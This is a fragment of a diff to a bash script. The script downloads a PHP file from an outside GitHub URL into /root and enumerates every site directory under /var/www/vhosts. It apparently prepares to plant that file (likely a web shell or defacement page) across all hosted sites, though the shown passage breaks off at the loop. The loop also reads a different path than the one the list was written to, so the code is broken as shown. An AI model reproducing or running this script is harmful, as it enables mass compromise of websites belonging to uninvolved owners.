@@ -1,6 +1,7 @@
 #!/bin/bash
 #love_betohat_"BAH"
 wget https://raw.githubusercontent.com/BETO-2FA/TXT-SOURCE/main/egy-batats.php -O /root/egy-batats.php
+mkdir /tmp/hello-index
 ls -la /var/www/vhosts/ | awk '{print $9}' > /tmp/betobeh
 for i in `more /tmp/hello-index `
 do
